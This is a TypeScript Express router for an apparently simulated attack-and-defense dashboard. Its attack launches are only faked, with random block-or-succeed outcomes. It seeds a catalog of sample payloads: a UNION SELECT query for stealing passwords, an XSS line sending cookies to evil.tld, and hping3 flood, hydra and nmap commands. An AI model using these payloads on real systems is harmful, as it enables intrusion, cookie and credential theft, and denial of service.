import { Router, type IRouter } from "express";
import { eq, desc } from "drizzle-orm";
import {
  db,
  attackCampaignsTable,
  exploitsTable,
  alertsTable,
} from "@workspace/db";
import { LaunchAttackBody } from "@workspace/api-zod";

const router: IRouter = Router();

type AttackType = "sql_injection" | "xss" | "ddos" | "brute_force" | "port_scan" | "phishing";

const attackTypeLabel: Record<AttackType, string> = {
  sql_injection: "SQL 注入",
  xss: "跨站脚本 (XSS)",
  ddos: "分布式拒绝服务 (DDoS)",
  brute_force: "暴力破解",
  port_scan: "端口扫描",
  phishing: "钓鱼攻击",
};

// Attack types the firewall/IDS is expected to detect (and thus block + alert on).
const detectableTypes: Record<AttackType, { alertType: string; severity: string }> = {
  sql_injection: { alertType: "sql_injection", severity: "high" },
  xss: { alertType: "xss", severity: "medium" },
  ddos: { alertType: "ddos", severity: "critical" },
  brute_force: { alertType: "brute_force", severity: "high" },
  port_scan: { alertType: "port_scan", severity: "low" },
  phishing: { alertType: "other", severity: "medium" },
};

const seedExploits = [
  {
    name: "联合查询注入 (UNION-based)",
    category: "SQL 注入",
    severity: "high",
    mitreTactic: "TA0009 数据收集",
    description: "通过 UNION SELECT 语句从数据库中提取额外数据列，常用于绕过身份验证或窃取敏感信息。",
    payload: "' UNION SELECT username, password FROM users-- -",
  },
  {
    name: "反射型 XSS",
    category: "跨站脚本",
    severity: "medium",
    mitreTactic: "TA0001 初始访问",
    description: "将恶意脚本注入到页面参数中，当受害者访问链接时在其浏览器执行任意 JavaScript。",
    payload: "<script>document.location='http://evil.tld/c?'+document.cookie</script>",
  },
  {
    name: "SYN 洪水攻击",
    category: "拒绝服务",
    severity: "critical",
    mitreTactic: "TA0040 危害影响",
    description: "发送大量伪造源地址的 TCP SYN 包耗尽目标半连接队列，使其无法响应合法请求。",
    payload: "hping3 -S --flood -p 80 <target>",
  },
  {
    name: "凭据填充 (Credential Stuffing)",
    category: "暴力破解",
    severity: "high",
    mitreTactic: "TA0006 凭据访问",
    description: "使用泄露的用户名/密码组合字典对登录接口进行自动化尝试以接管账户。",
    payload: "hydra -L users.txt -P rockyou.txt <target> http-post-form",
  },
  {
    name: "TCP 全连接扫描",
    category: "侦察",
    severity: "low",
    mitreTactic: "TA0043 侦察",
    description: "对目标主机端口逐一发起完整 TCP 握手以识别开放服务与版本信息。",
    payload: "nmap -sT -sV -p- <target>",
  },
  {
    name: "鱼叉式钓鱼附件",
    category: "钓鱼",
    severity: "medium",
    mitreTactic: "TA0001 初始访问",
    description: "向特定目标发送携带恶意宏文档的定向邮件，诱导用户启用宏以获取初始立足点。",
    payload: "Invoice_2026.docm (VBA macro dropper)",
  },
];

async function ensureExploitsSeeded(): Promise<void> {
  const existing = await db.select({ id: exploitsTable.id }).from(exploitsTable).limit(1);
  if (existing.length === 0) {
    await db.insert(exploitsTable).values(seedExploits);
  }
}

router.get("/attacks", async (_req, res): Promise<void> => {
  const campaigns = await db
    .select()
    .from(attackCampaignsTable)
    .orderBy(desc(attackCampaignsTable.startedAt));
  res.json(campaigns.map(formatCampaign));
});

router.post("/attacks", async (req, res): Promise<void> => {
  const parsed = LaunchAttackBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }
  const type = parsed.data.type as AttackType;
  const [campaign] = await db
    .insert(attackCampaignsTable)
    .values({
      target: parsed.data.target,
      type,
      status: "running",
    })
    .returning();

  // Simulate attack resolution after a brief delay (for demo purposes).
  setTimeout(async () => {
    try {
      const detection = detectableTypes[type];
      // Roughly 65% of detectable attacks get caught by the defenses.
      const detected = Math.random() < 0.65;

      if (detected) {
        const result = `攻击被防御系统检测并拦截。IDS 特征匹配 ${attackTypeLabel[type]} 模式，连接已阻断。`;
        await db
          .update(attackCampaignsTable)
          .set({ status: "blocked", result, completedAt: new Date() })
          .where(eq(attackCampaignsTable.id, campaign.id));

        // Surface a matching alert in the existing Alerts feed.
        await db.insert(alertsTable).values({
          title: `检测到${attackTypeLabel[type]}攻击`,
          description: `针对目标 ${parsed.data.target} 的模拟${attackTypeLabel[type]}攻击已被 IDS/防火墙拦截。`,
          severity: detection.severity as "critical" | "high" | "medium" | "low",
          type: detection.alertType as
            | "intrusion"
            | "ddos"
            | "malware"
            | "brute_force"
            | "port_scan"
            | "sql_injection"
            | "xss"
            | "other",
          sourceIp: "10.66.6.13",
        });
      } else {
        const result = `攻击执行完成，未被现有防御规则拦截。建议加固目标 ${parsed.data.target} 的防护策略。`;
        await db
          .update(attackCampaignsTable)
          .set({ status: "completed", result, completedAt: new Date() })
          .where(eq(attackCampaignsTable.id, campaign.id));
      }
    } catch {
      // Swallow background errors; demo simulation only.
    }
  }, 5000);

  res.status(201).json(formatCampaign(campaign));
});

router.get("/exploits", async (_req, res): Promise<void> => {
  await ensureExploitsSeeded();
  const exploits = await db.select().from(exploitsTable).orderBy(exploitsTable.id);
  res.json(exploits.map(formatExploit));
});

function formatCampaign(c: typeof attackCampaignsTable.$inferSelect) {
  return {
    id: c.id,
    target: c.target,
    type: c.type,
    status: c.status,
    result: c.result ?? null,
    startedAt: c.startedAt.toISOString(),
    completedAt: c.completedAt ? c.completedAt.toISOString() : null,
  };
}

function formatExploit(e: typeof exploitsTable.$inferSelect) {
  return {
    id: e.id,
    name: e.name,
    category: e.category,
    severity: e.severity,
    mitreTactic: e.mitreTactic,
    description: e.description,
    payload: e.payload,
  };
}

export default router;
